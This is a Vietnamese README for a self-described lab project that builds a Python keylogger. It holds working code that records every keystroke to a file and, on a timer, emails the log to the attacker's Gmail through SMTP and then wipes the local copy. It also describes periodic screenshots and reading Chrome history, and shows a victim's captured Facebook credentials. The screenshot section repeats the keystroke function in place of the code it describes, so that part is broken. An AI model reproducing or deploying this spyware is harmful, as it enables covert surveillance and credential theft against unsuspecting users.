# TOPIC: Giám sát bàn phím & Ghi ảnh màn hình (KEYLOGGER)

## Tổng quan

Đây là một dự án lab nghiên cứu bảo mật, mô phỏng các kỹ thuật phổ biến mà attacker sử dụng để thu thập dữ liệu, bao gồm:

- Ghi lại thao tác bàn phím (keylogging) → Lưu vào syslog.txt trong thư mục hệ thống
- Chụp màn hình định kỳ → Lưu ảnh vào thư mục screenshots
- Ghi lại lịch sử duyệt web → Đọc dữ liệu từ Google Chrome
- Gửi log qua email → Cấu hình thời gian gửi log bàn phím và ảnh màn hình về mail → Có thể biết được victim đang làm gì

## Mục tiêu dự án

Xây dựng một môi trường lab để mô phỏng các kỹ thuật thu thập dữ liệu của attacker

Triển khai các cơ chế cơ bản như ghi nhận input và chụp màn hình

Thực hành xử lý đa luồng và làm việc với hệ thống file trong Python

Tạo nền tảng để nghiên cứu các kỹ thuật phát hiện và phòng chống trong hệ thống thực tế

## Công nghệ sử dụng
Python 3
- pynput – lắng nghe bàn phím
- Pillow – chụp màn hình
- smtplib – gửi email
- threading – xử lý đa luồng

## Thực nghiệm
### 1. Thiết lập file log và thư mục lưu screenshot
```
log_file = os.path.expanduser("E:\\yourpath\\yourpath\\keylog.txt")
screenshot_folder = os.path.expanduser("E:\\yourpath\\yourpath\\screen")
```
Xác định đường dẫn tuyệt đối đến file lưu dữ liệu bàn phím và thư mục lưu ảnh màn hình.
- Ghi lại toàn bộ input từ người dùng
- Các file screenshot sẽ được lưu tại đây với tên theo timestamp
  
```
if not os.path.exists(screenshot_folder):
    os.makedirs(screenshot_folder)
```
Kiểm tra xem thư mục screen đã tồn tại chưa. Nếu chưa sẽ tạo thư mục mới bằng os.makedirs()

### 2. Thiết lập hàm ghi lại các phím bấm

```
def on_press(key):
    with open(log_file, "a", encoding="utf-8") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f" [{key}] ")
    print(f"Đã ghi phím: {key}")
```
Hàm on_press được gọi mỗi khi người dùng nhấn một phím trên bàn phím.

Chương trình mở file log ở chế độ ghi tiếp (append) và lưu lại phím vừa nhấn. Nếu là ký tự thông thường (a, b, 1, …) thì ghi trực tiếp vào file. Nếu là phím đặc biệt (Enter, Shift, Ctrl…), chương trình sẽ ghi dưới dạng [Key.xxx] để dễ phân biệt

<img width="462" height="141" alt="image" src="https://github.com/user-attachments/assets/02ae1cfa-4744-4762-b381-d565f118a073" />

Truy cập vào đường dẫn để xem bàn phím đã được ghi

<img width="717" height="521" alt="image" src="https://github.com/user-attachments/assets/e2e9c530-b953-440b-9d12-0737b816854d" />

Chúng ta có thể thấy victim đang vào đường dẫn là "Facebook" đang nhắn tin với một ai đó với tài khoản mật khẩu là username1 và matkhau321

### 3. Thiết lập hàm chụp ảnh màn hình
```
def on_press(key):
    with open(log_file, "a", encoding="utf-8") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f" [{key}] ")
    print(f"Đã ghi phím: {key}")
```
Hàm take_screenshot chạy liên tục trong vòng lặp vô hạn để chụp ảnh màn hình theo chu kỳ.

Trước khi chụp ảnh mới, chương trình kiểm tra số lượng file trong thư mục lưu trữ. Nếu số lượng ảnh lớn hơn hoặc bằng 10(tùy mn có thể đặt nó là bao nhiêu, nhưng hãy lưu ý dung lượng ổ cứng), nó sẽ sắp xếp các file theo thời gian tạo và xóa ảnh cũ nhất. Cơ chế này giúp giới hạn dung lượng lưu trữ và tránh tạo quá nhiều file.

Sau đó, chương trình sử dụng ImageGrab.grab() để chụp toàn bộ màn hình hiện tại và lưu lại với tên chứa timestamp, giúp dễ phân biệt theo thời gian.

Cuối cùng, chương trình tạm dừng 30 giây trước khi lặp lại, tạo thành quá trình chụp màn hình định kỳ.

<img width="720" height="516" alt="image" src="https://github.com/user-attachments/assets/d37df0b7-f83e-4699-a6c2-cebd9b871b10" />

Có thể thấy có tổng 10 ảnh màn hình được ghi lại như đã code và từ đó có thể thấy được nạn nhân đang làm những gì trên mạng.

### 4. Gửi dữ liệu log qua email
```
def send_email():
    while True:
        time.sleep(300)  
        try:
            with open(log_file, "r") as f:
                log_data = f.read()

            msg = MIMEText(log_data)
            msg["Subject"] = "Keylog Data"
            msg["From"] = "yourmail@gmail.com"
            msg["To"] = "yourmail@gmail.com"

            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()
                server.login("yourmail@gmail.com", "yourpass ")
                server.sendmail("yourmail@gmail.com", "yourmail@gmail.com", msg.as_string())

            with open(log_file, "w") as f:
                f.write("")  
            print("Đã gửi email log.")
        except Exception as e:
            print(f"Lỗi gửi email: {e}")
```
Hàm send_email chạy liên tục trong nền và thực hiện gửi dữ liệu log theo chu kỳ. Chương trình đọc toàn bộ nội dung từ file log bàn phím, sau đó đóng gói dữ liệu này thành một email bằng MIMEText.

Tiếp theo, chương trình kết nối đến server SMTP của Gmail, thiết lập kết nối bảo mật (starttls), đăng nhập tài khoản email và gửi nội dung log đến địa chỉ đã cấu hình.
- yourmail@gmail.com: là địa chỉ mail bạn muốn nhận
- yourpass: là mật khẩu mail của bạn ( khuyến nghị nên sử dụng mật khẩu ứng dụng)
  
<img width="707" height="561" alt="image" src="https://github.com/user-attachments/assets/f88c63cd-9443-4db4-b971-c640c2227515" />


Sau khi gửi thành công, file log sẽ được xóa nội dung để tránh lưu trữ lâu dài và chuẩn bị cho chu kỳ tiếp theo.

Nếu có lỗi xảy ra (ví dụ: lỗi kết nối hoặc đăng nhập), chương trình sẽ bắt exception và in ra thông báo lỗi.

<img width="1920" height="673" alt="image" src="https://github.com/user-attachments/assets/841bee62-338f-4cd3-970a-3a9025db1292" />

Chúng ta có thể thấy toàn bộ dữ liệu nội dung được ghi ở bàn phím đã được gửi về email -> rất nguy hiểm và có thể bị lợi dung để lấy thông tin từ đó tạo nên những cuộc tấn mạng của các hacker.

## Kết quả đạt được
- Hiểu cách hoạt động của kỹ thuật ghi phím ở mức ứng dụng
- Mô phỏng hành vi attacker trong thực tế
- Phân tích cách các hoạt động này bị phát hiện bởi Antivirus/EDR
- Rèn luyện kỹ năng Python trong lĩnh vực an toàn thông tin
- Giúp hiểu rõ cách attacker hoạt động và từ đó cải thiện khả năng phát hiện và phòng thủ

## Lưu ý !!!

Dự án này:
- Chỉ dùng cho học tập và nghiên cứu
- Chạy trong môi trường lab cá nhân

### Tác giả
[Tien Dat] - Cyber Security.
